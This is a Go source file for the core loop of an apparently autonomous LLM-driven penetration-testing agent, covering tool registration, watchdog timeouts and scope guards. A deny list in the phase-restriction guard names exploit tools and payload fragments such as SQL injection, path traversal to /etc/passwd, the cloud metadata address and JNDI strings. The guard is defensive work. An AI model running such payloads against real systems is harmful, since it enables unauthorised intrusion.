// Package agent provides the core agent loop.
package agent

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/url"
	"os/exec"
	"regexp"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf8"

	"github.com/xalgord/xalgorix/v4/internal/config"
	"github.com/xalgord/xalgorix/v4/internal/llm"
	"github.com/xalgord/xalgorix/v4/internal/safe"
	"github.com/xalgord/xalgorix/v4/internal/scanctx"
	"github.com/xalgord/xalgorix/v4/internal/scopeguard"
	"github.com/xalgord/xalgorix/v4/internal/tools"
	"github.com/xalgord/xalgorix/v4/internal/tools/agentmail"
	"github.com/xalgord/xalgorix/v4/internal/tools/agentsgraph"
	"github.com/xalgord/xalgorix/v4/internal/tools/browser"
	"github.com/xalgord/xalgorix/v4/internal/tools/fileedit"
	"github.com/xalgord/xalgorix/v4/internal/tools/finish"
	"github.com/xalgord/xalgorix/v4/internal/tools/httpclient"
	"github.com/xalgord/xalgorix/v4/internal/tools/notes"
	"github.com/xalgord/xalgorix/v4/internal/tools/pageagent"
	"github.com/xalgord/xalgorix/v4/internal/tools/proxy"
	"github.com/xalgord/xalgorix/v4/internal/tools/python"
	"github.com/xalgord/xalgorix/v4/internal/tools/reporting"
	skillstool "github.com/xalgord/xalgorix/v4/internal/tools/skills"
	"github.com/xalgord/xalgorix/v4/internal/tools/terminal"
	"github.com/xalgord/xalgorix/v4/internal/tools/websearch"
)

var thinkRegex = regexp.MustCompile(`(?s)<think>.*?</think>`)

// toolHardTimeout maps tool names to their per-invocation hard ceiling.
// Tools not in the map fall back to defaultToolHardTimeout (15 min).
var toolHardTimeout = map[string]time.Duration{
	"terminal_execute": 65 * time.Minute,
	"browser_action":   10 * time.Minute,
}

// defaultToolHardTimeout is the per-invocation hard ceiling applied to any
// tool not explicitly listed in toolHardTimeout.
const defaultToolHardTimeout = 15 * time.Minute

// maxCumulativeRateLimitWait bounds the total time the agent loop may spend
// parked in the provider-rate-limit backoff. A persistently 429'd provider
// would otherwise stall the scan indefinitely because touchActivity() keeps
// the idle watchdog alive during the wait. Set to 0 to disable the ceiling.
const maxCumulativeRateLimitWait = 6 * time.Hour

// hardTimeoutFor returns the configured hard-timeout ceiling for the given
// tool name, falling back to defaultToolHardTimeout when the tool is not
// listed in toolHardTimeout.
func (a *Agent) hardTimeoutFor(tool string) time.Duration {
	if t, ok := toolHardTimeout[tool]; ok {
		return t
	}
	return defaultToolHardTimeout
}

// Event represents an agent event (for UI updates).
type Event struct {
	Type        string // "thinking", "tool_call", "tool_result", "message", "error", "finished"
	Content     string
	ToolName    string
	ToolArgs    map[string]string
	ToolResult  tools.Result
	AgentID     string
	Timestamp   time.Time
	TotalTokens int
}

// toolExecResult holds the result of an async tool execution.
type toolExecResult struct {
	Result tools.Result
	Err    error
}

// Agent runs the LLM agent loop.
type Agent struct {
	ID                         string
	Name                       string
	cfg                        *config.Config
	client                     *llm.Client
	registry                   *tools.Registry
	scanCtx                    *scanctx.ScanContext // per-session state (vulns, notes, terminal, browser)
	messages                   []llm.Message
	msgMu                      sync.Mutex
	events                     chan Event
	maxIter                    int
	stopped                    atomic.Bool
	ctx                        context.Context
	cancel                     context.CancelFunc
	lastActivity               time.Time
	activityMu                 sync.Mutex
	scanStart                  time.Time // when Run() was called
	discoveryMode              bool      // When true, allow finish at any iteration (for Phase 1 enumeration)
	allowedPhases              []int     // selected methodology phases, empty means all
	reconMode                  string    // active or passive reconnaissance
	scanIntensity              string    // active or passive testing/scanning
	activityHosts              []string  // normalized target hosts used by passive policy
	passiveReconGuardActive    bool      // full scans with passive recon block direct access until passive evidence is collected
	passiveReconGuardDone      bool
	passiveReconPassiveLookups int
	passiveReconBlockedActive  int
	passiveReconSourceKeys     map[string]bool
	hooks                      *HookRegistry     // extensible lifecycle hooks
	state                      *ScanState        // shared mutable scan state for hooks
	localGuard                 scopeguard.Config // operator's listener identity, consulted by shouldBlockForOutOfScope to detect Local_Or_Listener_Host references in Gated_Tool args
}

// AgentOption configures optional behavior on a *Agent. The
// pattern lets callers (chiefly the per-scan code path in
// internal/web/server.go's runScanInstance) inject a pre-built
// llm.Client carrying a per-scan endpoint resolver, without
// reshuffling NewAgent's required-parameter signature.
//
// Validates: B1 (per-scan provider_profile resolver wiring).
type AgentOption func(*Agent)

// WithLLMClient swaps the default llm.NewClient(cfg) construction
// for a caller-supplied client. The web layer uses this to inject
// a client wrapped with llm.WithResolver(NewFixedResolver(ep)) so
// the operator's resolved provider_profile actually steers the
// scan's outbound traffic. nil resets to default behavior.
//
// Validates: B1 (per-scan provider_profile resolver wiring).
func WithLLMClient(c *llm.Client) AgentOption {
	return func(a *Agent) {
		if c != nil {
			a.client = c
		}
	}
}

// NewAgent creates a new agent.
// If sc is nil, a default ScanContext is used (CLI mode backward compatibility).
//
// localGuard carries the operator's listener identity (bind address +
// listener port) and is consulted by shouldBlockForOutOfScope to
// classify a Gated_Tool argument's host portion as a
// Local_Or_Listener_Host. Pass scopeguard.Config{BindAddr: "127.0.0.1",
// Port: 0} for callers that don't have a real listener (CLI / tests);
// the listener-port rule only fires when the test feeds a matching
// bind:port, so the default is safe.
//
// scOrOpts is a polymorphic tail used to keep the existing call
// sites compiling unchanged. Callers may pass:
//   - nothing (CLI default ScanContext, no options),
//   - a single *scanctx.ScanContext (existing web-server call site),
//   - one or more AgentOption (new B1 path), or
//   - a *scanctx.ScanContext followed by one or more AgentOption.
//
// Mixing both flavors keeps every old call site working while
// letting the per-scan resolver injection skip building a separate
// constructor.
func NewAgent(cfg *config.Config, name string, events chan Event, localGuard scopeguard.Config, scOrOpts ...any) *Agent {
	// Fix Python httpx interfering with ProjectDiscovery httpx
	fixHttpxConflict()

	// Resolve ScanContext — use provided or fall back to default.
	// Also collect any AgentOption values from the polymorphic
	// tail so callers can mix the legacy ScanContext-only call
	// shape with the new B1 option-bearing call shape without
	// either side knowing about the other.
	var sctx *scanctx.ScanContext
	var opts []AgentOption
	for _, v := range scOrOpts {
		switch t := v.(type) {
		case *scanctx.ScanContext:
			if t != nil {
				sctx = t
			}
		case AgentOption:
			if t != nil {
				opts = append(opts, t)
			}
		case nil:
			// tolerate explicit nils so callers passing a
			// (*scanctx.ScanContext)(nil) don't surprise
			// themselves
		default:
			// Unknown type — log once and skip rather than
			// panic. This branch is unreachable under
			// vet-clean callers, but keeps the function
			// robust against future drift.
			log.Printf("[agent] NewAgent: ignoring unsupported scOrOpts argument %T", v)
		}
	}
	if sctx == nil {
		sctx = scanctx.Default()
	}

	reg := tools.NewRegistry()
	reg.SetScanContextID(sctx.ID)

	terminal.Register(reg)
	fileedit.Register(reg)
	proxy.Register(reg)
	httpclient.Register(reg)
	browser.Register(reg)
	pageagent.Register(reg)
	// NOTE: playwright.Register removed — it registered the same "browser_action" name
	// and overwrote the enhanced rod browser with a weaker curl-based stub.
	notes.Register(reg)
	reporting.Register(reg)
	finish.Register(reg)
	python.Register(reg)
	websearch.Register(reg)
	agentmail.Register(reg)
	skillstool.Register(reg, cfg.SkillsDir)

	hookReg := NewHookRegistry()
	RegisterDefaultHooks(hookReg)

	a := &Agent{
		ID:           fmt.Sprintf("agent_%d", time.Now().UnixNano()),
		Name:         name,
		cfg:          cfg,
		client:       llm.NewClient(cfg),
		registry:     reg,
		scanCtx:      sctx,
		events:       events,
		maxIter:      cfg.MaxIterations,
		ctx:          context.Background(),
		lastActivity: time.Now(),
		hooks:        hookReg,
		state:        NewScanState(),
		localGuard:   localGuard,
	}

	// Apply per-call AgentOption values (e.g. WithLLMClient). Options
	// run after the default client is constructed so a nil option
	// leaves the default in place; WithLLMClient overwrites it with
	// a caller-supplied client carrying a per-scan resolver.
	for _, opt := range opts {
		opt(a)
	}

	// Create cancellable context
	a.ctx, a.cancel = context.WithCancel(a.ctx)
	// Wire context to LLM client so cancel interrupts pending HTTP requests
	a.client.SetContext(a.ctx)

	agentsgraph.Register(reg, func(subName string, targets []string, task string) (string, error) {
		subEvents := make(chan Event, 256)
		// Sub-agents inherit the parent's localGuard rather than re-deriving
		// it. The listener identity is a per-process invariant — every
		// agent in the graph consults the same bind:port — so propagating
		// the parent's Config keeps the Local_Or_Listener_Host rule
		// uniform across the agent tree (Requirement 3.4).
		subAgent := NewAgent(cfg, subName, subEvents, a.localGuard, sctx)
		subAgent.SetPhaseRestrictions(a.allowedPhases)
		subAgent.SetActivityPolicy(a.reconMode, a.scanIntensity, a.activityHosts)
		if a.discoveryMode {
			subAgent.SetDiscoveryMode(true)
		}
		var results strings.Builder
		done := make(chan struct{})
		// Sub-agent event-forwarder is a long-lived streaming consumer.
		// Wrap with safe.Go so a panic during forwarding (e.g. on a
		// closed parent channel) is logged and counted instead of
		// taking down the parent agent. The inner `defer close(done)`
		// runs during fn's unwind even on panic, so the parent's
		// `<-done` rendezvous still completes.
		safe.Go("agent.subagent_stream", a.scanCtx.ID, func() {
			defer close(done)
			for evt := range subEvents {
				// Forward partial results to sub-agent state
				if evt.Type == "tool_result" && evt.ToolResult.Output != "" {
					partial := fmt.Sprintf("[%s] %s", evt.ToolName, truncStr(evt.ToolResult.Output, 200))
					results.WriteString(partial)
					results.WriteByte('\n')
					agentsgraph.AddPartialResult(subAgent.ID, partial)
				}
				if evt.Type == "finished" {
					results.WriteString("\nCompleted: ")
					results.WriteString(truncStr(evt.Content, 500))
					results.WriteString("\n")
				}
				// Also forward events to parent for UI visibility
				if a.events != nil {
					parentEvt := evt
					parentEvt.AgentID = subAgent.ID
					safeSend(a.events, parentEvt, 0)
				}
			}
		})
		subAgent.Run(targets, task)
		close(subEvents)
		<-done
		return results.String(), nil
	})

	return a
}

// SetDiscoveryMode configures the agent to skip minimum iteration checks on finish.
// Used for Phase 1 subdomain enumeration where we want the agent to exit immediately.
func (a *Agent) SetDiscoveryMode(enabled bool) {
	a.discoveryMode = enabled
	a.refreshPassiveReconGuard()
}

// SetPhaseRestrictions configures the selected methodology phases for policy hooks.
// An empty slice means the full methodology is allowed.
func (a *Agent) SetPhaseRestrictions(phases []int) {
	a.allowedPhases = append([]int(nil), phases...)
	a.refreshPassiveReconGuard()
}

const (
	activityModeActive  = "active"
	activityModePassive = "passive"

	passiveReconMinLookups      = 2
	passiveReconMinSourceKinds  = 2
	passiveReconFallbackLookups = 3
)

// SetActivityPolicy configures passive/active access controls for recon and testing.
func (a *Agent) SetActivityPolicy(reconMode, scanIntensity string, targets []string) {
	a.reconMode = normalizeActivityMode(reconMode)
	a.scanIntensity = normalizeActivityMode(scanIntensity)
	if a.scanIntensity == activityModePassive {
		a.reconMode = activityModePassive
	}
	a.activityHosts = normalizeActivityHosts(targets)
	a.refreshPassiveReconGuard()
}

func (a *Agent) shouldUsePassiveReconGuard() bool {
	return normalizeActivityMode(a.reconMode) == activityModePassive &&
		normalizeActivityMode(a.scanIntensity) == activityModeActive &&
		!a.discoveryMode &&
		!isReconReportOnlyPhaseSelection(a.allowedPhases)
}

func (a *Agent) refreshPassiveReconGuard() {
	if a.shouldUsePassiveReconGuard() {
		a.passiveReconGuardActive = !a.passiveReconGuardDone
	} else {
		a.passiveReconGuardActive = false
	}
	a.syncPassiveReconGuardState()
}

func (a *Agent) resetPassiveReconGuardForRun() {
	a.passiveReconGuardDone = false
	a.passiveReconPassiveLookups = 0
	a.passiveReconBlockedActive = 0
	a.passiveReconSourceKeys = make(map[string]bool)
	a.refreshPassiveReconGuard()
}

func (a *Agent) syncPassiveReconGuardState() {
	if a.state == nil {
		return
	}
	a.state.PassiveReconGuardActive = a.passiveReconGuardActive
	a.state.PassiveReconPassiveLookups = a.passiveReconPassiveLookups
	a.state.PassiveReconBlockedActive = a.passiveReconBlockedActive
}

func (a *Agent) recordPassiveReconLookup(toolName string, toolArgs map[string]string) {
	if !a.passiveReconGuardActive {
		return
	}
	if a.passiveReconSourceKeys == nil {
		a.passiveReconSourceKeys = make(map[string]bool)
	}
	a.passiveReconPassiveLookups++
	a.passiveReconSourceKeys[classifyPassiveReconSource(toolName, toolArgs)] = true
	a.syncPassiveReconGuardState()
}

func (a *Agent) recordPassiveReconBlock() {
	if !a.passiveReconGuardActive {
		return
	}
	a.passiveReconBlockedActive++
	a.syncPassiveReconGuardState()
}

func (a *Agent) finishPassiveReconGuard() {
	a.passiveReconGuardActive = false
	a.passiveReconGuardDone = true
	a.syncPassiveReconGuardState()
}

func (a *Agent) maybeCompletePassiveReconGuardAtIterationStart(iter int) string {
	if !a.passiveReconGuardActive || !a.shouldUsePassiveReconGuard() || iter == 0 || !a.passiveReconGuardSatisfied() {
		return ""
	}
	a.finishPassiveReconGuard()
	return "Passive reconnaissance guard complete: passive evidence has been collected. Active testing is now allowed because scan intensity is active."
}

func (a *Agent) passiveReconGuardSatisfied() bool {
	if a.passiveReconPassiveLookups < passiveReconMinLookups {
		return false
	}
	if len(a.passiveReconSourceKeys) >= passiveReconMinSourceKinds {
		return true
	}
	return a.passiveReconPassiveLookups >= passiveReconFallbackLookups
}

func classifyPassiveReconSource(toolName string, toolArgs map[string]string) string {
	combined := strings.ToLower(toolName)
	for _, value := range toolArgs {
		combined += " " + strings.ToLower(value)
	}
	switch {
	case isAllowedLocalArtifactAnalysis(strings.ToLower(toolName), toolArgs):
		return "local_artifact"
	case strings.Contains(combined, "crt.sh") ||
		strings.Contains(combined, "certspotter") ||
		strings.Contains(combined, "certificate transparency") ||
		strings.Contains(combined, "ct log") ||
		strings.Contains(combined, "certstream"):
		return "certificate_transparency"
	case strings.Contains(combined, "web.archive.org") ||
		strings.Contains(combined, "wayback") ||
		strings.Contains(combined, "urlscan") ||
		strings.Contains(combined, "commoncrawl"):
		return "public_archive"
	case strings.Contains(combined, "shodan") ||
		strings.Contains(combined, "censys") ||
		strings.Contains(combined, "securitytrails") ||
		strings.Contains(combined, "virustotal") ||
		strings.Contains(combined, "alienvault") ||
		strings.Contains(combined, "binaryedge") ||
		strings.Contains(combined, "fofa") ||
		strings.Contains(combined, "zoomeye"):
		return "third_party_intel"
	case strings.Contains(combined, "whois") || strings.Contains(combined, "rdap"):
		return "registry"
	case strings.Contains(combined, "dig ") ||
		strings.Contains(combined, "nslookup") ||
		strings.Contains(combined, "dnsdumpster") ||
		strings.Contains(combined, "dnsx"):
		return "dns_records"
	case strings.Contains(combined, "github.com") ||
		strings.Contains(combined, "gitlab.com") ||
		strings.Contains(combined, "sourcegraph") ||
		strings.Contains(combined, "grep.app"):
		return "source_code"
	case strings.EqualFold(toolName, "web_search"):
		return "web_search"
	default:
		return "passive_lookup"
	}
}

func normalizeActivityMode(value string) string {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case activityModePassive:
		return activityModePassive
	default:
		return activityModeActive
	}
}

func normalizeActivityHosts(targets []string) []string {
	seen := make(map[string]bool)
	var hosts []string
	var add func(string)
	add = func(host string) {
		host = strings.ToLower(strings.TrimSpace(host))
		host = strings.TrimPrefix(host, "*.")
		host = strings.TrimPrefix(host, ".")
		host = strings.TrimSuffix(host, ".")
		if host == "" || seen[host] {
			return
		}
		seen[host] = true
		hosts = append(hosts, host)
		if strings.HasPrefix(host, "www.") {
			add(strings.TrimPrefix(host, "www."))
		}
		parts := strings.Split(host, ".")
		if len(parts) >= 2 {
			add(strings.Join(parts[len(parts)-2:], "."))
		}
	}
	for _, target := range targets {
		target = strings.TrimSpace(target)
		if target == "" {
			continue
		}
		if strings.Contains(target, "://") {
			if parsed, err := url.Parse(target); err == nil && parsed.Hostname() != "" {
				add(parsed.Hostname())
				continue
			}
		}
		raw := strings.TrimPrefix(target, "http://")
		raw = strings.TrimPrefix(raw, "https://")
		raw = strings.Split(raw, "/")[0]
		raw = strings.Split(raw, "?")[0]
		raw = strings.Split(raw, "#")[0]
		if strings.Contains(raw, ":") {
			if parsed, err := url.Parse("//" + raw); err == nil && parsed.Hostname() != "" {
				raw = parsed.Hostname()
			}
		}
		add(raw)
	}
	return hosts
}

func isReconReportOnlyPhaseSelection(phases []int) bool {
	if len(phases) == 0 {
		return false
	}
	for _, phase := range phases {
		if phase != 1 && phase != 22 {
			return false
		}
	}
	return true
}

// stripThink removes <think>...</think> blocks from the response.
func stripThink(s string) string {
	return thinkRegex.ReplaceAllString(s, "")
}

// touchActivity updates the last activity timestamp (thread-safe).
func (a *Agent) touchActivity() {
	a.activityMu.Lock()
	a.lastActivity = time.Now()
	a.activityMu.Unlock()
}

// sinceActivity returns how long since last activity (thread-safe).
func (a *Agent) sinceActivity() time.Duration {
	a.activityMu.Lock()
	defer a.activityMu.Unlock()
	return time.Since(a.lastActivity)
}

// startWatchdog starts a background monitor that enforces:
// 1. Per-process timeout: kills individual commands running > 30 minutes
// 2. Scan-level timeout: force-stops entire scan after scanMaxDuration (0 = infinite)
// 3. Idle detection: kills agent stuck with no processes and no LLM response (0 = disabled)
func (a *Agent) startWatchdog() func() {
	stopChan := make(chan struct{})

	const (
		processMaxDuration = 30 * time.Minute // kill single process after this
		scanMaxDuration    = 0                // 0 = infinite (no scan-level timeout — needed for 300+ domain scans)
		idleKillThreshold  = 0 * time.Minute  // 0 = disabled (stuck-loop detection handles per-target stalls)
	)

	// Watchdog is a long-running background monitor; wrap with safe.Go
	// so a panic inside the tick loop (e.g. from terminal/scancontext
	// state mutation) is logged and counted instead of crashing the
	// process.
	safe.Go("agent.watchdog", a.scanCtx.ID, func() {
		// Check every 30 seconds
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		var lastStatusMsg string
		var lastStatusTime time.Time

		for {
			select {
			case <-stopChan:
				return
			case <-ticker.C:
				if a.stopped.Load() {
					return
				}

				// ── Check 1: Scan-level timeout (0 = infinite/disabled) ──
				if scanMaxDuration > 0 {
					scanDuration := time.Since(a.scanStart)
					if scanDuration > time.Duration(scanMaxDuration)*time.Hour {
						a.emit(Event{Type: "error", Content: fmt.Sprintf("⛔ Scan timeout: scan has been running for %s (max %s). Force stopping.", scanDuration.Round(time.Minute), time.Duration(scanMaxDuration)*time.Hour)})
						a.stopped.Store(true)
						if a.cancel != nil {
							a.cancel()
						}
						activeCmd, _ := a.scanCtx.Terminal.GetActiveCommand()
						safe.IncWatchdogKill()
						log.Printf("[watchdog] WARN kill command=%q duration=%s scan=%s reason=scan_max_duration",
							activeCmd, scanDuration.Round(time.Second), a.scanCtx.ID)
						a.scanCtx.Terminal.KillAll()
						return
					}
				}

				// ── Reap dead processes that weren't properly untracked ──
				reaped := a.scanCtx.Terminal.ReapDead()
				if reaped > 0 {
					a.emit(Event{Type: "message", Content: fmt.Sprintf("🧹 Watchdog: reaped %d dead process(es) from tracker", reaped)})
				}

				activeProcs := a.scanCtx.Terminal.ActiveProcessCount()
				activeCmd, cmdDuration := a.scanCtx.Terminal.GetActiveCommand()

				// ── Check 2: Per-process timeout ──
				// If a single process has been running too long, kill it
				if activeProcs > 0 && cmdDuration > processMaxDuration {
					a.emit(Event{Type: "error", Content: fmt.Sprintf("⚠️ Watchdog: Process running for %s (limit: %s), killing it: %s", cmdDuration.Round(time.Minute), processMaxDuration, activeCmd)})
					safe.IncWatchdogKill()
					log.Printf("[watchdog] WARN kill command=%q duration=%s scan=%s reason=process_max_duration",
						activeCmd, cmdDuration.Round(time.Second), a.scanCtx.ID)
					a.scanCtx.Terminal.KillAll()
					a.touchActivity() // reset idle timer since we just intervened
					continue
				}

				// ── If processes are actually running and within limits, update activity ──
				if activeProcs > 0 {
					a.touchActivity()

					// Emit status about what's running (every 5 minutes, deduplicated)
					if cmdDuration > 5*time.Minute && time.Since(lastStatusTime) > 5*time.Minute {
						statusMsg := fmt.Sprintf("⏳ Active: %d process(es)", activeProcs)
						if activeCmd != "" {
							cmdPreview := activeCmd
							if len(cmdPreview) > 100 {
								cmdPreview = cmdPreview[:100] + "..."
							}
							statusMsg += fmt.Sprintf(" | Running: %s (%s)", cmdPreview, cmdDuration.Round(time.Minute))
						}
						if statusMsg != lastStatusMsg {
							a.emit(Event{Type: "message", Content: statusMsg})
							lastStatusMsg = statusMsg
							lastStatusTime = time.Now()
						}
					}
					continue
				}

				// ── Check 3: Idle detection (idleKillThreshold = 0 means disabled) ──
				if idleKillThreshold > 0 {
					idleTime := a.sinceActivity()
					if idleTime > 5*time.Minute && idleTime <= 10*time.Minute {
						a.emit(Event{Type: "message", Content: fmt.Sprintf("⚠️ Watchdog: No activity for %s. No active processes.", idleTime.Round(time.Second))})
					}

					if idleTime > 10*time.Minute && idleTime <= idleKillThreshold {
						a.emit(Event{Type: "message", Content: fmt.Sprintf("⚠️ Watchdog: Idle for %s. Will force-stop at %s.", idleTime.Round(time.Second), idleKillThreshold)})
					}

					if idleTime > idleKillThreshold {
						a.emit(Event{Type: "error", Content: fmt.Sprintf("⚠️ Watchdog: Agent truly stuck for %s (no active processes, no LLM response). Force stopping.", idleTime.Round(time.Second))})
						a.stopped.Store(true)
						if a.cancel != nil {
							a.cancel()
						}
						idleCmd, _ := a.scanCtx.Terminal.GetActiveCommand()
						safe.IncWatchdogKill()
						log.Printf("[watchdog] WARN kill command=%q duration=%s scan=%s reason=idle_timeout",
							idleCmd, idleTime.Round(time.Second), a.scanCtx.ID)
						a.scanCtx.Terminal.KillAll()
						return
					}
				}
			}
		}
	})

	return func() {
		close(stopChan)
	}
}

// executeToolAsync runs a tool in a goroutine with heartbeat monitoring.
// It keeps the watchdog alive by updating lastActivity while the tool runs,
// and streams partial output from long-running terminal commands.
//
// The function body is guarded by safe.Recover so any panic in the tool
// invocation, heartbeat plumbing, or watchdog hooks is converted into a
// typed error rather than crashing the agent loop. The tool invocation is
// additionally bounded by a context.WithTimeout derived from
// hardTimeoutFor(toolName) plus a 30-second grace window so even tools
// that ignore their own context still terminate within the ceiling.
func (a *Agent) executeToolAsync(toolName string, toolArgs map[string]string) (result tools.Result, returnErr error) {
	defer safe.Recover("agent.tool_exec", a.scanCtx.ID, &returnErr)

	// Set up streaming callback for terminal commands
	var lastPartialOutput string
	a.scanCtx.Terminal.SetStreamCallback(func(partial string) {
		a.touchActivity()
		// Only emit if output changed
		if partial != lastPartialOutput {
			lastPartialOutput = partial
			// Trim to last 500 chars for the UI
			preview := partial
			if len(preview) > 500 {
				preview = "..." + preview[len(preview)-500:]
			}
			a.emit(Event{
				Type:    "message",
				Content: fmt.Sprintf("⏳ [%s] partial output:\n%s", toolName, preview),
			})
		}
	})
	defer a.scanCtx.Terminal.ClearStreamCallback()

	// Execute in goroutine with panic recovery.
	//
	// NOTE (Task 6.3): this goroutine is intentionally NOT wrapped with
	// safe.Go. The inner `defer recover()` here has bespoke behavior the
	// generic safe.Recover cannot replicate: on panic it must construct
	// a tools.Result{Error: "tool panicked: …"} and push it on resultCh
	// so the agent loop can surface a tool result (with the typed err)
	// to the LLM instead of bubbling the panic up. The enclosing
	// executeToolAsync function body is already wrapped by
	// `defer safe.Recover("agent.tool_exec", …)` (Task 6.2), which
	// catches any panic that escapes this defer (e.g. a panic in the
	// recover branch itself). Wrapping with safe.Go in addition would
	// duplicate counter increments and log lines without adding safety.
	resultCh := make(chan toolExecResult, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[ERROR] [PANIC] Tool '%s' panicked: %v\n%s", toolName, r, debug.Stack())
				resultCh <- toolExecResult{
					Result: tools.Result{Error: fmt.Sprintf("tool panicked: %v", r)},
					Err:    fmt.Errorf("tool '%s' panicked: %v", toolName, r),
				}
			}
		}()
		res, err := a.registry.Execute(toolName, toolArgs)
		resultCh <- toolExecResult{Result: res, Err: err}
	}()

	// Heartbeat loop while waiting for tool to complete
	heartbeat := time.NewTicker(15 * time.Second)
	defer heartbeat.Stop()

	// Hard timeout safety net (P2.1): bound the tool invocation by the
	// per-tool ceiling plus a 30-second grace so even tools that ignore
	// their own ctx still terminate. We derive from a.ctx so parent
	// cancellation propagates as well.
	hardTimeoutDuration := a.hardTimeoutFor(toolName)
	tcCtx, tcCancel := context.WithTimeout(a.ctx, hardTimeoutDuration+30*time.Second)
	defer tcCancel()

	for {
		select {
		case res := <-resultCh:
			// Tool completed — update activity and return immediately
			a.touchActivity()
			return res.Result, res.Err

		case <-heartbeat.C:
			// Keep watchdog alive while tool is running
			a.touchActivity()

		case <-tcCtx.Done():
			// Distinguish hard-timeout from parent cancellation. When the
			// parent (a.ctx) is canceled, tcCtx.Err() is context.Canceled;
			// when our own deadline elapses it is context.DeadlineExceeded.
			if tcCtx.Err() == context.DeadlineExceeded {
				a.emit(Event{Type: "error", Content: fmt.Sprintf("⛔ Tool '%s' timed out after %s. Force-returning to prevent infinite hang.", toolName, hardTimeoutDuration)})
				switch toolName {
				case "terminal_execute", "python_action":
					a.scanCtx.Terminal.KillAll()
				case "browser_action":
					browser.CleanupContext(a.scanCtx.ID)
				}
				return tools.Result{Error: fmt.Sprintf("[TIMEOUT exceeded %s]", hardTimeoutDuration)}, nil
			}
			// Parent canceled (agent stopped).
			return tools.Result{Error: "Agent stopped during tool execution"}, fmt.Errorf("agent canceled")
		}
	}
}

func (a *Agent) shouldBlockForPhaseRestriction(toolName string, toolArgs map[string]string) (bool, string) {
	if !isReconReportOnlyPhaseSelection(a.allowedPhases) {
		return false, ""
	}

	lowerTool := strings.ToLower(toolName)
	if lowerTool == "report_vulnerability" {
		return true, "report_vulnerability is out of scope for a reconnaissance/report-only scan. Record recon findings in notes and finish with a recon-focused summary instead."
	}

	combined := lowerTool
	for _, value := range toolArgs {
		combined += " " + strings.ToLower(value)
	}

	blockedPatterns := []string{
		"sqlmap", "dalfox", "nuclei", "nikto", "xsstrike", "commix",
		"tplmap", "ssrfmap", "msfconsole", "metasploit", "searchsploit",
		"exploit-db", "wpscan", "joomscan",
		"union select", "<script", "alert(", "sleep(", "pg_sleep",
		"waitfor delay", "../etc/passwd", "/etc/passwd", "169.254.169.254",
		"__proto__", "%0d%0a", "jndi:", "burp collaborator",
	}
	for _, pattern := range blockedPatterns {
		if strings.Contains(combined, pattern) {
			return true, fmt.Sprintf("Blocked %q because this scan is limited to reconnaissance and reporting. Allowed recon includes DNS records, IP resolution, ports, services, HTTP metadata, technologies, URLs, and non-exploit evidence collection.", pattern)
		}
	}

	return false, ""
}

func (a *Agent) shouldBlockForActivityPolicy(toolName string, toolArgs map[string]string) (bool, string) {
	passiveScan := normalizeActivityMode(a.scanIntensity) == activityModePassive
	passiveReconGuard := a.passiveReconGuardActive && a.shouldUsePassiveReconGuard()
	passiveRecon := normalizeActivityMode(a.reconMode) == activityModePassive && (a.discoveryMode || isReconReportOnlyPhaseSelection(a.allowedPhases) || passiveReconGuard)
	if !passiveScan && !passiveRecon {
		return false, ""
	}

	lowerTool := strings.ToLower(toolName)
	if lowerTool == "web_search" {
		if passiveReconGuard {
			a.recordPassiveReconLookup(toolName, toolArgs)
		}
		return false, ""
	}
	switch lowerTool {
	case "add_note", "read_notes", "finish", "list_skills", "read_skill", "report_vulnerability", "agentmail":
		return false, ""
	case "browser_action", "page_agent":
		if passiveReconGuard {
			a.recordPassiveReconBlock()
		}
		return true, passivePolicyBlockReason(passiveScan)
	}

	combined := lowerTool
	for _, value := range toolArgs {
		combined += " " + strings.ToLower(value)
	}
	if isAllowedPassiveLookup(combined, a.activityHosts) {
		if passiveReconGuard {
			a.recordPassiveReconLookup(toolName, toolArgs)
		}
		return false, ""
	}
	if containsActiveAccessPattern(combined) {
		if passiveReconGuard {
			a.recordPassiveReconBlock()
		}
		return true, passivePolicyBlockReason(passiveScan)
	}
	if referencesActivityTarget(combined, a.activityHosts) {
		if isAllowedLocalArtifactAnalysis(lowerTool, toolArgs) {
			if passiveReconGuard {
				a.recordPassiveReconLookup(toolName, toolArgs)
			}
			return false, ""
		}
		if passiveReconGuard {
			a.recordPassiveReconBlock()
		}
		return true, passivePolicyBlockReason(passiveScan)
	}
	return false, ""
}

// shouldBlockForOutOfScope rejects Gated_Tool calls whose arguments
// reference the operator's own machine or local network — loopback,
// RFC1918, link-local, ULA, unspecified, hostnames that resolve to
// any of those, or the dashboard's own bind:port listener. Runs
// unconditionally — even in active mode — so the agent cannot pivot
// into the operator's box from a Gated_Tool.
//
// Tools subject to this gate (Gated_Tools):
//
//   - terminal_execute, python_action, browser_action, page_agent,
//     pageagent — anything that can hit a network target.
//   - report_vulnerability — files findings; the explicit
//     target/endpoint arguments are checked too.
//
// All other tools (notes, finish, web_search, agentmail, list_skills,
// read_skill, etc.) bypass this gate entirely — they are exempt
// because they don't probe targets.
//
// Activity_Hosts (a.activityHosts) is intentionally NOT consulted
// here. Engagement-scope policing is no longer the agent guard's
// job; this function only protects the operator's machine and
// listener (per design.md → "Open Question: Requirement 3.7"). The
// Local_Or_Listener_Host check fires regardless of whether scope is
// populated.
//
// Returns (false, "") when:
//
//   - the tool is not in the gated list,
//   - the args don't reference any host-shaped token,
//   - none of the referenced hosts are Local_Or_Listener_Hosts.
func (a *Agent) shouldBlockForOutOfScope(toolName string, toolArgs map[string]string) (bool, string) {
	lowerTool := strings.ToLower(toolName)
	switch lowerTool {
	case "terminal_execute", "python_action", "browser_action", "page_agent", "pageagent",
		"report_vulnerability":
		// gated
	default:
		return false, ""
	}

	// Pull every host-looking token from the args. An empty result
	// just means no host was named (e.g. hostless local-artifact
	// commands like grep/awk/jq) — let those flow through.
	hosts := extractHostsFromArgs(toolArgs)
	for _, h := range hosts {
		if scopeguard.IsLocalOrListener(a.localGuard, h) {
			return true, fmt.Sprintf(
				"%q points at the operator's machine or local network. "+
					"Refusing to probe localhost / RFC1918 / the dashboard's "+
					"listener from a Gated_Tool.", h,
			)
		}
	}

	// Belt-and-braces leg for report_vulnerability: validate the
	// explicit `target` and `endpoint` arguments directly against
	// the Local_Or_Listener_Host classifier. The findings handler
	// must not file a report against the operator's own machine
	// even if extractHostsFromArgs missed the token shape.
	// Activity_Hosts is NOT consulted here — engagement-scope
